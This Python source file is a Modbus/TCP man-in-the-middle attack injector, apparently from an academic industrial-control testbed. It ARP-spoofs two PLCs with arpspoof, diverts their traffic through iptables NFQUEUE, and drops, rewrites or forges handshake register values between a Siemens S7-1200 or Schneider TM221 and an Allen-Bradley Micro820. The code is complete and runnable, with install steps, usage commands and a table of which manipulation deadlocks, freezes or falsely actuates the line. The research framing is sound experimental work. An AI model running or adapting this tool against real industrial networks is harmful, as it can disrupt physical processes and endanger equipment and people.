#!/usr/bin/env python3
"""
attack_injector.py

MATRIX Testbed — inter-PLC Modbus handshake MITM attack injector (runs on Kali).


Goal: The goal of this script is to position the adversary to sit in the middle of the Modbus/TCP conversation between one PLC client
and the Micro820 (AB, the Modbus SERVER),and  then DROP, REWRITE, or FORGE specific
handshake register transitions within a bounded, timestamped window, reproducibly. It is much better than interactive terminal experimentation because the 
attack is repeatable, timestamped, and logged. The attack log is the ground truth for the experiment.

The following is the pipeline of how the script works:
  (1) arpspoof: ARP-poisons the two targets so their traffic to EACH OTHER is
                   delivered to the advsersary (Attacker Node, or Kali) host at layer 2. arpspoof requires two process that run per client.
  
  (2) ip_forward=1: the kernel forwards redirected packets so the PLCs keep
                   talking (we are transparent until the window opens).
  (3) iptables FORWARD ... -j NFQUEUE: diverts ONLY this pair's tcp/502 into a
                   netfilter queue so our handler gets a verdict on each packet.
  (4) handle(): This function is called per-packet verdict and: accept (forward unchanged, the default),
                   drop (suppress a write), or modify+accept (rewrite a value). this where the actual attackm logic is implemented.

Everything is restored on exit (iptables flushed, arpspoof stopped so caches
repair, ip_forward restored). This occurs even on Ctrl-C / crash.

Undertand Control-Layer Handoff Procedure:

AB (Micro820) is the  Modbus SERVER at 192.168.50.20, unit id 255. with important Two registers:
  reg 0 (400001)- S7 <-> AB: S7-1200 PLC writes 1="ready" when the workpiece is ready for pickup; and AB writes 2="ack" after pickup occurred.  
                            it's BLIND(no secondary check).
  reg 1 (400002)- AB <-> TM221 -- AB writes 1="ready" when the workpiece is ready; and then writes 0 when TM221 writes reg3=2.
  reg 2 (400003) - AB <-> TM221 -- TM221 writes 2="ack", AB reads this and writes back reg1 = 0. AB never writes this register. Its fully written by TM221's IOSCanner.


Four transitions and how each travels on the wire:
  T1  S7 "ready"  reg0=1 : S7 WRITES reg0 to AB (FC06-write single register), one packet per workpiece cycle.
  T2  AB "ack"    reg0=2 : S7 POLLS AB (FC03 read holding registers); ack rides AB's REPLY.
  T3  AB "ready"  reg2=1 : TM221 POLLS AB (FC03 read holding registers); rides AB's REPLY. DEFENDED by and additional Sensor (LightBarrier on the ConveyorBelt).
  T4  TM221 "ack" reg3=2 : TM221 WRITES reg3 to AB (FC06 write single register), one packet per process cycle.


ACTION x CARRIER -- what each attack does on the wire
=============================================================================
  carrier "write"  (T1, T4):
     suppress : DROP the client's write of the signal value -> AB never sees it.
     forge    : REWRITE the client's write value -> signal (uses the client's own
                sparse write  instead of creating own packet).
  carrier "read_reply" (T2, T3):
     suppress : REWRITE the register in AB's FC03 reply -> 0 (deny the signal;
                sustained, since the client polls continuously).
     forge    : REWRITE the register in AB's FC03 reply -> signal (fabricate it;
                T3 forge SHOULD be DEFEATED by TM221's light barrier.
  replay uses the same rewrite machinery as forge, per carrier.

WHICH TRANSITION FOR WHICH RESULT:
  * deadlock by dropping the ready    -> T1 suppress  (--transition ready)
  * freeze S7 by denying the ack      -> T2 suppress  (--transition ack)
  * forge the ack so S7 proceeds      -> T2 forge     (--transition ack)   <= robust
  * forge ready, defeated by sensor   -> T3 forge     (tm221-ab --transition ready)
  * forge ready to AB (no real piece) -> T1 forge     (--transition ready) <= sparse

SAME-LENGTH REWRITES ONLY: register values are fixed 2-byte fields, so rewrites
are length-preserving -> the TCP stream never desyncs.

GROUND-TRUTH LOG: results/<run_id>/attack_log.json (share --run-id with the
experiment logger; align pcap + state + attack-log by run_id + window_open_wall).
NTP-sync Kali and the SCADA PC so cross-host timestamps are comparable.

INSTALL (Kali):
    sudo apt install dsniff libnetfilter-queue-dev
    pip install netfilterqueue scapy --break-system-packages

USAGE (root):
    sudo python3 attack_injector.py --pair s7-ab --transition ready \
         --action suppress --iface eth1 --run-id s7_suppress_t1_001
    # time-based: add --window-trigger <seconds>
    # if you start arpspoof yourself: add --no-spoof

Author : MATRIX / Intelligent Connectivity Group -- UCT
"""

import argparse
import json
import os
import signal
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone

# Third-party (install as noted). Imported at top so a missing dependency fails
# immediately with a clear ImportError rather than mid-run.
from netfilterqueue import NetfilterQueue           # type: ignore
from scapy.all import IP, TCP, Raw                   # type: ignore


# CONFIGURATION 

AB_IP        = "192.168.50.20"                 # Micro820 -- the Modbus SERVER
CLIENT_IP    = {"s7-ab": "192.168.50.10",      # S7-1200
                "tm221-ab": "192.168.50.50"}   # TM221
MODBUS_PORT  = 502
QUEUE_NUM    = 1                               # default NFQUEUE id (see --queue-num)
RESULTS_DEFAULT = "results"

# Per (pair, transition): register, carrier, signal value, sensor-defended?, tag.
# This is the single source of truth main() turns into the handler's rules.

TRANSITIONS = {
    ("s7-ab",    "ready"): dict(reg=0, carrier="write",      signal=1, defended=False, tag="T1"),
    ("s7-ab",    "ack"):   dict(reg=0, carrier="read_reply", signal=2, defended=False, tag="T2"),
    ("tm221-ab", "ready"): dict(reg=1, carrier="read_reply", signal=1, defended=True,  tag="T3"),
    ("tm221-ab", "ack"):   dict(reg=2, carrier="write",      signal=2, defended=False, tag="T4"),
}

FC_READ_HOLDING   = 0x03      # read holding registers (polls; signal rides the reply)
FC_WRITE_SINGLE   = 0x06      # write single register (the handshake writes)
FC_WRITE_MULTIPLE = 0x10      # write multiple registers (handled defensively)

MAX_LOG_EVENTS = 20000        # cap the per-packet event list (counters stay exact)


# RUNTIME STATE  (mutated by the packet handler and the main loop)

STATE = {
    "window_open": False, "finished": False,
    "armed_ts": None, "armed_wall": None,
    "open_ts": None, "open_wall": None, "close_wall": None,
}
COUNTERS = {"matched": 0, "dropped": 0, "rewritten": 0, "passed": 0, "injected": 0}
EVENTS = []
PENDING_READS = {}   # (client_src_port, txid) -> (start_addr, qty, monotonic)
CFG = {}             # resolved attack params, filled by main()


# 
# SMALL HELPERS
# 
def now_iso():
    """Return current UTC time as an ISO-8601 string.

    Called from: everywhere a wall-clock timestamp is logged, so the attack-log
    aligns with the pcap and state log. (provided NTP-sync is configured on Kali VM and scada PC)

    Returns:
        str: e.g. "2026-11-08T19:36:35.350533+00:00".
    """
    return datetime.now(timezone.utc).isoformat()


def log_event(rec):
    """Append one manipulation record to the in-memory event list (bounded).

    Called from: the packet handler on each drop/rewrite (or internal error).
    Beyond MAX_LOG_EVENTS, events are counted (COUNTERS) but not stored.

    Args:
        rec (dict): the event record.

    Returns:
        None.
    """
    if len(EVENTS) < MAX_LOG_EVENTS:
        EVENTS.append(rec)


def u16(b, i):
    """Read a big-endian unsigned 16-bit int from bytes `b` at offset `i`.

    Called from: all Modbus parsing (Modbus is big-endian on the wire).

    Args:
        b (bytes): the buffer.
        i (int): offset of the high byte.

    Returns:
        int: the 16-bit value (0..65535).
    """
    return (b[i] << 8) | b[i + 1]


def prune_pending(older_than=5.0):
    """Garbage-collect stale FC03-read tracking entries.

    Called from: the handler each time it records a new FC03 request.

    Args:
        older_than (float): seconds; entries older than this are dropped.

    Returns:
        None.
    """
    cutoff = time.monotonic() - older_than
    for k in [k for k, v in PENDING_READS.items() if v[2] < cutoff]:
        PENDING_READS.pop(k, None)


# 
# MODBUS FIELD PARSING / EDITING ROUTINES
#
def _write_sets_reg_to(load, fc, reg, value):
    """Return whether a write PDU sets register `reg` to `value`.

    Called from: the handler's write-carrier SUPPRESS branch (to decide whether
    to drop this packet e.g if reg0 is written to 1, and we want to drop, we can just do that is a second).

    Args:
        load (bytes): full Modbus/TCP payload (MBAP + PDU).
        fc (int): function code (FC06 or FC16).
        reg (int): target register address.
        value (int): value sought (the signal).

    Returns:
        bool: True iff this write sets `reg` to `value`.
    """
    if fc == FC_WRITE_SINGLE and len(load) >= 12:
        return u16(load, 8) == reg and u16(load, 10) == value
    if fc == FC_WRITE_MULTIPLE and len(load) >= 13:
        start = u16(load, 8); qty = u16(load, 10)
        if start <= reg < start + qty:
            voff = 13 + (reg - start) * 2
            if voff + 2 <= len(load):
                return u16(load, voff) == value
    return False


def _value_offset_in_write(load, fc, reg):
    """Locate the byte offset of `reg`'s value inside a write PDU.

    Called from: the handler's write-carrier FORGE branch (to know which 2 bytes
    to overwrite with the forged signal).

    Args:
        load (bytes): full Modbus/TCP payload.
        fc (int): function code (FC06 or FC16).
        reg (int): target register address.

    Returns:
        int | None: byte offset of `reg`'s 2-byte value, or None if not addressed.
    """
    if fc == FC_WRITE_SINGLE and len(load) >= 12 and u16(load, 8) == reg:
        return 10
    if fc == FC_WRITE_MULTIPLE and len(load) >= 13:
        start = u16(load, 8); qty = u16(load, 10)
        if start <= reg < start + qty:
            voff = 13 + (reg - start) * 2
            if voff + 2 <= len(load):
                return voff
    return None


def _rewrite_value(pkt, load, voff, new_value, packet):
    """Overwrite a 2-byte register value in-place and re-emit the packet.

    Called from: the write-carrier FORGE branch and the read-reply branch. The
    field is exactly 2 bytes, so length is unchanged and TCP never desyncs;
    IP/TCP checksums are recomputed (Modbus/TCP has no app-layer checksum).

    Args:
        pkt (scapy IP): the parsed packet (Raw layer replaced).
        load (bytes): current Modbus payload bytes.
        voff (int): offset of the 2-byte value to overwrite.
        new_value (int): value to write (0..65535).
        packet (netfilterqueue.Packet): the queue packet to set_payload+accept.

    Returns:
        int: the previous value at `voff` (for "from -> to" logging).
    """
    prev = u16(load, voff)
    buf = bytearray(load)
    buf[voff]     = (new_value >> 8) & 0xFF
    buf[voff + 1] = new_value & 0xFF
    pkt[Raw].load = bytes(buf)
    del pkt[IP].chksum                      # force scapy to recompute on serialize
    del pkt[TCP].chksum
    packet.set_payload(bytes(pkt))          # hand edited bytes back to the kernel
    packet.accept()                         # ...and forward the modified frame
    return prev


#
# PACKET HANDLER -- the core verdict logic
#
def handle(packet):
    """NFQUEUE callback: decide accept/drop/modify for ONE diverted packet.

    Called from: NetfilterQueue, once per packet matched by our iptables rule
    (this pair's tcp/502, both directions). Thin wrapper: on ANY exception in the
    real logic we forward the packet untouched, so a bug degrades to transparent
    rather than black-holing the live PLC conversation.

    Args:
        packet (netfilterqueue.Packet): the queued packet; exactly one of
            packet.accept()/packet.drop() must be called on it.

    Returns:
        None.
    """
    try:
        _handle(packet)
    except Exception as exc:
        try:
            packet.accept()
        except Exception:
            pass
        log_event({"ts": now_iso(), "action": "handler_error", "detail": repr(exc)})


def _handle(packet):
    """The real per-packet verdict logic (handle() is the safety wrapper).

    Called from: handle(). Parses the Modbus header, classifies request-to-AB vs
    reply-from-AB, and applies the configured action within the window. Anything
    not targeted is forwarded unchanged.

    Args:
        packet (netfilterqueue.Packet): the queued packet.

    Returns:
        None. Exactly one of packet.drop()/packet.accept() is always called.
    """
    raw = packet.get_payload()              # IP-layer bytes of the forwarded frame
    pkt = IP(raw)

    if TCP not in pkt or Raw not in pkt:    # non-Modbus/TCP -> forward
        COUNTERS["passed"] += 1
        packet.accept(); return

    tcp  = pkt[TCP]
    load = bytes(pkt[Raw].load)
    if len(load) < 8:                       # too short for a full MBAP header
        COUNTERS["passed"] += 1
        packet.accept(); return

    txid = u16(load, 0)
    fc   = load[7]
    to_ab   = (pkt[IP].dst == AB_IP and tcp.dport == MODBUS_PORT)   # request
    from_ab = (pkt[IP].src == AB_IP and tcp.sport == MODBUS_PORT)   # reply

    reg      = CFG["reg"]
    carrier  = CFG["carrier"]
    signal_v = CFG["signal"]
    to_value = CFG["to_value"]
    action   = CFG["action"]
    
    # Close the window from inside the handler too, so a heavy packet stream
    # (which can starve the main-loop clock) still ends the hold on time.
    if STATE["window_open"] and STATE["open_ts"] is not None \
            and (time.monotonic() - STATE["open_ts"]) >= CFG["hold"]:
        STATE["window_open"] = False
        STATE["finished"] = True
        
    # Track FC03 read REQUESTS so we can locate `reg` inside the matching REPLY.
    if to_ab and fc == FC_READ_HOLDING and len(load) >= 12:
        PENDING_READS[(tcp.sport, txid)] = (u16(load, 8), u16(load, 10), time.monotonic())
        prune_pending()
        COUNTERS["passed"] += 1
        packet.accept(); return

    # ----- WRITE-carrier (T1 ready reg0=1, T4 ack reg2=2) -----
    if carrier == "write" and to_ab and fc in (FC_WRITE_SINGLE, FC_WRITE_MULTIPLE):
        if action == "suppress":
            if _write_sets_reg_to(load, fc, reg, signal_v):
                _maybe_open_window()
                if STATE["window_open"]:
                    COUNTERS["matched"] += 1
                    COUNTERS["dropped"] += 1
                    log_event({"ts": now_iso(), "action": "drop_write",
                               "fc": fc, "reg": reg, "value": signal_v, "txid": txid})
                    packet.drop(); return
        else:   # forge / replay: rewrite the written value TO the signal
            voff = _value_offset_in_write(load, fc, reg)
            if voff is not None:
                if not STATE["window_open"] and not CFG["time_mode"]:
                    _open_window()
                if STATE["window_open"]:
                    desired = signal_v if to_value is None else to_value
                    if u16(load, voff) != desired:
                        prev = _rewrite_value(pkt, load, voff, desired, packet)
                        COUNTERS["matched"] += 1
                        COUNTERS["rewritten"] += 1
                        log_event({"ts": now_iso(), "action": "rewrite_write",
                                   "reg": reg, "from": prev, "to": desired, "txid": txid})
                        return
        COUNTERS["passed"] += 1
        packet.accept(); return

    # ----- READ-REPLY-carrier (T2 ack reg0=2, T3 ready reg1=1) -----
    if carrier == "read_reply" and from_ab and fc == FC_READ_HOLDING and len(load) >= 9:
        byte_count = load[8]
        pend = PENDING_READS.pop((tcp.dport, txid), None)
        if pend is None:
            COUNTERS["passed"] += 1
            packet.accept(); return
        start, qty, _ = pend
        if not (start <= reg < start + qty):
            COUNTERS["passed"] += 1
            packet.accept(); return
        voff = 9 + (reg - start) * 2
        if voff + 2 > 8 + 1 + byte_count or voff + 2 > len(load):
            COUNTERS["passed"] += 1
            packet.accept(); return

        current = u16(load, voff)
        if action == "suppress":
            desired = to_value                 # deny the signal (default 0)
            trigger_here = (current == signal_v)
        else:                                  # forge / replay
            desired = signal_v if to_value is None else to_value
            trigger_here = True

        if not STATE["window_open"]:
            if CFG["time_mode"]:
                pass
            elif trigger_here:
                _open_window()

        if STATE["window_open"] and current != desired:
            prev = _rewrite_value(pkt, load, voff, desired, packet)
            COUNTERS["matched"] += 1
            COUNTERS["rewritten"] += 1
            log_event({"ts": now_iso(), "action": "rewrite_reply",
                       "reg": reg, "from": prev, "to": desired, "txid": txid})
            return

        COUNTERS["passed"] += 1
        packet.accept(); return

    COUNTERS["passed"] += 1
    packet.accept()


#
# WINDOW STATE MACHINE
#
def _open_window():
    """Mark the window OPEN and record the onset timestamp.

    Called from: the handler (event mode, first actionable packet) and
    check_timing() (time mode, immediately).

    Returns:
        None.
    """
    STATE["window_open"] = True
    STATE["open_ts"] = time.monotonic()
    STATE["open_wall"] = now_iso()
    print(f"[{STATE['open_wall']}] WINDOW OPEN (onset) -- acting for {CFG['hold']} s")


def _maybe_open_window():
    """Open the window on the first matching write, but only in event mode.

    Called from: the write-carrier SUPPRESS branch (time mode opens via
    check_timing).

    Returns:
        None.
    """
    if not STATE["window_open"] and not CFG["time_mode"]:
        _open_window()


def _close_window():
    """Mark the window CLOSED and record the close timestamp (once).

    Called from: check_timing() (hold elapsed) and main()'s finally block.

    Returns:
        None.
    """
    if STATE["window_open"]:
        STATE["window_open"] = False
        STATE["close_wall"] = now_iso()
        print(f"[{STATE['close_wall']}] WINDOW CLOSED")


def check_timing(args):
    """Drive the window clock from the main loop (~2x/second).

    Called from: main()'s NFQUEUE loop between packet batches. Opens the window in
    time mode, closes it when the hold elapses, and aborts in event mode if the
    trigger never appears within --max-wait.

    Args:
        args (argparse.Namespace): parsed CLI (uses args.max_wait).

    Returns:
        None. May set STATE["finished"]=True.
    """
    nowm = time.monotonic()
    # time mode: open immediately
    if CFG["time_mode"] and not STATE["window_open"] and STATE["open_ts"] is None:
        _open_window()
    # once open, close + FINISH when hold elapses:
    if STATE["window_open"] and STATE["open_ts"] is not None \
            and (nowm - STATE["open_ts"]) >= CFG["hold"]:
        _close_window()
        STATE["finished"] = True
        return
    # event mode: abort ONLY if the window NEVER opened within max_wait:
    if (not CFG["time_mode"] and STATE["open_ts"] is None
            and (nowm - STATE["armed_ts"]) >= args.max_wait):
        print(f"[{now_iso()}] trigger not seen within {args.max_wait}s -- giving up")
        STATE["finished"] = True


#
# ON-PATH SETUP / TEARDOWN  (arpspoof + ip_forward + iptables NFQUEUE)
# 
_IPTABLES_RULES = []
_ARPSPOOF = []
_ORIG_IP_FORWARD = None


def run_cmd(cmd):
    """Run a command, raising on non-zero exit (iptables/sysctl).

    Called from: setup_network()/teardown_network().

    Args:
        cmd (list[str]): argv.

    Returns:
        subprocess.CompletedProcess.

    Raises:
        subprocess.CalledProcessError: if the command exits non-zero.
    """
    return subprocess.run(cmd, check=True, capture_output=True, text=True)


def setup_network(args, client_ip):
    """Get on-path and divert this pair's Modbus into NFQUEUE.

    Called from: main(), once, before the packet loop. Does, in order:
      1. enable net.ipv4.ip_forward (remembering the old value),
      2. insert two iptables FORWARD rules (client<->AB tcp/502 -> NFQUEUE),
      3. start two arpspoof processes (one per direction). This replaces the old
         bettercap step: arpspoof poisons ONLY these two hosts, surgically -- no
         subnet-wide storm -- which is what made redirection reliable.

    Equivalent manual command:
        sysctl -w net.ipv4.ip_forward=1
        arpspoof -i eth1 -t <client> <AB> &
        arpspoof -i eth1 -t <AB> <client> &

    Args:
        args (argparse.Namespace): uses iface, queue_num, results, run_id, no_spoof.
        client_ip (str): client side of the pair (S7 or TM221).

    Returns:
        None.

    Raises:
        RuntimeError: if an arpspoof process exits immediately.
        subprocess.CalledProcessError: if an iptables/sysctl command fails.
    """
    global _ORIG_IP_FORWARD

    with open("/proc/sys/net/ipv4/ip_forward") as f:
        _ORIG_IP_FORWARD = f.read().strip()
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

    rules = [
        ["iptables", "-I", "FORWARD", "-p", "tcp", "-s", client_ip, "-d", AB_IP,
         "--dport", str(MODBUS_PORT), "-j", "NFQUEUE", "--queue-num", str(args.queue_num)],
        ["iptables", "-I", "FORWARD", "-p", "tcp", "-s", AB_IP, "-d", client_ip,
         "--sport", str(MODBUS_PORT), "-j", "NFQUEUE", "--queue-num", str(args.queue_num)],
    ]
    for r in rules:
        run_cmd(r)
        _IPTABLES_RULES.append(r)

    if not args.no_spoof:
        out_dir = os.path.join(args.results, args.run_id)
        os.makedirs(out_dir, exist_ok=True)
        logf = open(os.path.join(out_dir, "arpspoof.log"), "w")
        # "arpspoof -t <target> <host>" tells <target> that <host> is at us.
        for tgt, host in ((client_ip, AB_IP), (AB_IP, client_ip)):
            p = subprocess.Popen(["arpspoof", "-i", args.iface, "-t", tgt, host],
                                 stdout=logf, stderr=subprocess.STDOUT)
            _ARPSPOOF.append(p)
        time.sleep(2)
        for p in _ARPSPOOF:
            if p.poll() is not None:
                raise RuntimeError("arpspoof exited immediately -- check --iface, "
                                   "that dsniff is installed, and root permissions")
        print(f"[{now_iso()}] arpspoof running: {client_ip} <-> {AB_IP} via {args.iface}")


def teardown_network():
    """Reverse everything setup_network() did (best-effort, idempotent).

    Called from: main()'s finally block. Order:
      1. stop arpspoof (SIGINT so dsniff repairs the victims' ARP caches),
      2. delete our iptables rules,
      3. restore the original ip_forward value.

    Returns:
        None.
    """
    global _ARPSPOOF
    for p in _ARPSPOOF:
        try:
            p.send_signal(signal.SIGINT)
            p.wait(timeout=5)
        except Exception:
            try: p.kill()
            except Exception: pass
    _ARPSPOOF = []

    for r in list(_IPTABLES_RULES):
        delr = ["iptables", "-D"] + r[2:]
        try: run_cmd(delr)
        except Exception: pass
        _IPTABLES_RULES.remove(r)

    if _ORIG_IP_FORWARD is not None:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(_ORIG_IP_FORWARD)
        except Exception:
            pass


# 
# ATTACK LOG
# 
def write_attack_log(args, client_ip, profile):
    """Write the ground-truth attack-log JSON for this run.

    Called from: main()'s finally block, after teardown. window_open_wall is the
    onset to align with the pcap and state log.

    Args:
        args (argparse.Namespace): parsed CLI.
        client_ip (str): client side of the pair.
        profile (dict): the TRANSITIONS entry used.

    Returns:
        str: the path of the JSON file written.
    """
    out_dir = os.path.join(args.results, args.run_id)
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, "attack_log.json")
    doc = {
        "run_id": args.run_id,
        "config": {
            "pair": args.pair, "transition": args.transition, "action": args.action,
            "register": profile["reg"], "carrier": profile["carrier"],
            "signal_value": profile["signal"], "to_value": CFG["to_value"],
            "sensor_defended": profile["defended"], "transition_tag": profile["tag"],
            "trigger_mode": "time" if CFG["time_mode"] else "event",
            "hold_s": CFG["hold"], "iface": args.iface,
            "client_ip": client_ip, "ab_ip": AB_IP, "spoofer": "arpspoof",
        },
        "armed_wall": STATE["armed_wall"],
        "window_open_wall": STATE["open_wall"],
        "window_close_wall": STATE["close_wall"],
        "counters": COUNTERS,
        "events": EVENTS,
        "events_truncated": len(EVENTS) >= MAX_LOG_EVENTS,
    }
    with open(path, "w") as f:
        json.dump(doc, f, indent=2)
    print(f"attack-log written: {path}")
    return path


#
# CLI + MAIN
#
def build_parser():
    """Build the argparse parser.

    Called from: main().

    Returns:
        argparse.ArgumentParser.
    """
    p = argparse.ArgumentParser(description="MATRIX inter-PLC Modbus handshake MITM injector.")
    p.add_argument("--pair", required=True, choices=["s7-ab", "tm221-ab"],
                   help="which client<->AB conversation to sit in")
    p.add_argument("--transition", required=True, choices=["ready", "ack"],
                   help="ready (=1) or ack (=2); with --pair selects T1..T4")
    p.add_argument("--action", required=True, choices=["suppress", "forge", "replay"],
                   help="suppress (drop/deny) | forge (fabricate) | replay")
    p.add_argument("--iface", required=True, help="Kali control-LAN interface (for arpspoof)")
    p.add_argument("--run-id", required=True, help="shared with the experiment logger")
    p.add_argument("--hold", type=float, default=30.0,
                   help="event-mode window seconds once open (default 30)")
    p.add_argument("--window-trigger", type=float, default=None, metavar="SEC",
                   help="TIME mode: open immediately and act for SEC seconds. "
                        "Omit for EVENT mode.")
    p.add_argument("--to-value", type=int, default=None,
                   help="override the rewritten/forged value. Default suppress->0, "
                        "forge/replay->signal.")
    p.add_argument("--max-wait", type=float, default=120.0,
                   help="event mode: give up if the trigger isn't seen in this many s")
    p.add_argument("--queue-num", type=int, default=QUEUE_NUM, help="NFQUEUE number")
    p.add_argument("--results", default=RESULTS_DEFAULT, help="output directory")
    p.add_argument("--no-spoof", action="store_true",
                   help="skip arpspoof (use if you start it yourself; we still do NFQUEUE)")
    p.add_argument("--dry-run", action="store_true", help="print the plan and exit")
    return p


def _predict(args, profile):
    """Return a one-line predicted outcome (hypothesis-then-result).

    Called from: main(), printed in the banner.

    Args:
        args (argparse.Namespace): parsed CLI.
        profile (dict): the TRANSITIONS entry.

    Returns:
        str: short human description of the expected effect.
    """
    a = args.action
    if a == "suppress" and profile["carrier"] == "write":
        return "drop the signal write -> receiver never sees it -> deadlock (blind trust)"
    if a == "suppress" and profile["carrier"] == "read_reply":
        return "deny the signal in replies -> client frozen despite correct physical state"
    if a == "forge" and profile["defended"]:
        return "fabricated signal SHOULD BE DEFEATED by the light-barrier cross-check"
    if a == "forge" and profile["carrier"] == "read_reply":
        return "fabricated signal in replies -> polling client acts on false state (blind)"
    if a == "forge" and profile["carrier"] == "write":
        return "rewrite the client's write -> AB sees a signal the client didn't send (sparse)"
    if a == "replay":
        return "replayed signal -> duplicate/false actuation on a blind-trust channel"
    return "see matrix"


def main():
    """Entry point: parse args, resolve the attack, set up the MITM, run the
    NFQUEUE loop until the window closes, then tear down and write the log.

    Called from: the __main__ guard.

    Returns:
        int: exit code (0 ok, 2 on config/permission error).
    """
    args = build_parser().parse_args()

    profile = TRANSITIONS.get((args.pair, args.transition))
    if profile is None:
        print(f"no transition for pair={args.pair} transition={args.transition}")
        return 2
    client_ip = CLIENT_IP[args.pair]

    if args.to_value is not None:
        to_value = args.to_value
    elif args.action == "suppress":
        to_value = 0
    else:
        to_value = profile["signal"]

    CFG.update({
        "reg": profile["reg"], "carrier": profile["carrier"], "signal": profile["signal"],
        "action": args.action, "to_value": to_value,
        "time_mode": args.window_trigger is not None,
        "hold": args.window_trigger if args.window_trigger is not None else args.hold,
    })

    print("=" * 72)
    print(f" MATRIX attack injector -- {profile['tag']}  (arpspoof MITM)")
    print(f"   pair/transition : {args.pair} / {args.transition}  (reg {profile['reg']}, "
          f"signal={profile['signal']}, carrier={profile['carrier']})")
    print(f"   action          : {args.action}")
    print(f"   trigger         : {'time-based' if CFG['time_mode'] else 'event-triggered'}"
          f"  hold={CFG['hold']} s")
    print(f"   on-path         : {client_ip} <-> {AB_IP} via {args.iface}"
          f"{' (arpspoof SKIPPED)' if args.no_spoof else ''}")
    print(f"   sensor-defended : {profile['defended']}")
    print(f"   PREDICTED       : {_predict(args, profile)}")
    print(f"   run-id          : {args.run_id}")
    print("=" * 72)
    if args.dry_run:
        print("dry-run -- no changes made."); return 0
    if os.geteuid() != 0:
        print("ERROR: must run as root (NFQUEUE/iptables/arpspoof)."); return 2

    STATE["armed_ts"] = time.monotonic()
    STATE["armed_wall"] = now_iso()

    nfqueue = NetfilterQueue()
    def _sig(_signo, _frame):
        STATE["finished"] = True
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    try:
        setup_network(args, client_ip)
        nfqueue.bind(args.queue_num, handle)
        s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(0.5)
        print(f"[{now_iso()}] ARMED -- waiting"
              f"{' for trigger signal' if not CFG['time_mode'] else ''} ...")
        while not STATE["finished"]:
            try:
                nfqueue.run_socket(s)
            except socket.timeout:
                pass
            except Exception as exc:
                print(f"nfqueue error: {exc}")
            check_timing(args)
        s.close()
    finally:
        _close_window()
        try: nfqueue.unbind()
        except Exception: pass
        teardown_network()
        write_attack_log(args, client_ip, profile)
        print(f"counters: {COUNTERS}")
    return 0


if __name__ == "__main__":
    sys.exit(main())